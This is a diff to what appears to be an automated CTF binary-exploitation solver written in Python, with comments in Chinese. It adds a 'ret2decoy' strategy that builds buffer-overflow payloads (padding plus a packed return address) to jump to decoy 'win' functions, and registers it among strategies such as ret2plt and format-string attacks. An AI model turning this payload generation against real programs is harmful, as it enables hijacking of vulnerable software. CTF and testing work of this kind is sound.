@@ -450,6 +450,45 @@ def s_ret2win_flag(ch: Challenge, f: Facts) -> Iterable[Plan]:
                                    + (f" prompt={prompt!r}" if prompt else ""), tag="flag")
 
 
+# --------------------------------------------------------------------------- 1c. 诱饵 win
+def s_ret2win_decoy(ch: Challenge, f: Facts) -> Iterable[Plan]:
+    """诱饵 win（`system("echo flag")` 这类）：**每道题只打 1 次**。
+
+    只产出「控制流真的到达 win」的证据（echo 参数回显），不产出 flag，
+    由 `oracle.judge_win_executed` 固定 `ok=False`、`cause="win_executed"`。
+    载荷取静态偏移，不做邻近枚举；同一函数里排在目标 sink 之前的输入，
+    先喂一个 `b"0\\n"` 占位，保证溢出发生在最后一次 read/gets/scanf 上
+    （否则会被后面的输入覆盖）。
+    """
+    for w in f.wins:
+        if w.kind != "decoy":
+            continue
+        m = re.search(r'echo\s+([^")\\]*)', w.evidence or "")
+        marker = m.group(1).strip().encode("latin-1", "replace") if m else b""
+        if not marker:
+            # 拿不到 echo 的参数就没法判「win 真的执行了」，不产出假证据
+            return
+        groups: dict[int, list[Vuln]] = {}
+        for v in f.vulns:
+            if v.func_entry is None or v.offset is None:
+                continue
+            if v.size_limit is not None and v.size_limit <= v.offset:
+                continue
+            groups.setdefault(v.func_entry, []).append(v)
+        if not groups:
+            return
+        ent = max(groups, key=lambda e: max(v.call_addr for v in groups[e]))
+        seq = sorted(groups[ent], key=lambda v: v.call_addr)
+        vul = seq[-1]
+        steps = [Send(b"0\n")] * (len(seq) - 1)
+        payload = _pad(ch, vul.offset) + ch.p64(w.addr) + _term(vul.sink)
+        steps.append(Send(payload))
+        yield Plan("ret2decoy", steps,
+                   f"jump to decoy ({w.evidence}) @ {hex(w.addr)} "
+                   f"off={vul.offset} pre={len(seq) - 1}",
+                   tag=f"decoy:{marker.hex()}")
+
+
 # --------------------------------------------------------------------------- 2. ret2system@plt
 def s_ret2plt(ch: Challenge, f: Facts) -> Iterable[Plan]:
     system = ch.plt("system")
@@ -982,4 +1021,6 @@ STRATEGIES = [
     s_fmtstr,
     # 兜底：只打 flag 的题（不计入 shell 成功率，单独记账）
     s_ret2win_flag,
+    # 证据态：诱饵 win 只打 1 次，仅证明控制流到达（不记 SHELL/FLAG）
+    s_ret2win_decoy,
 ]
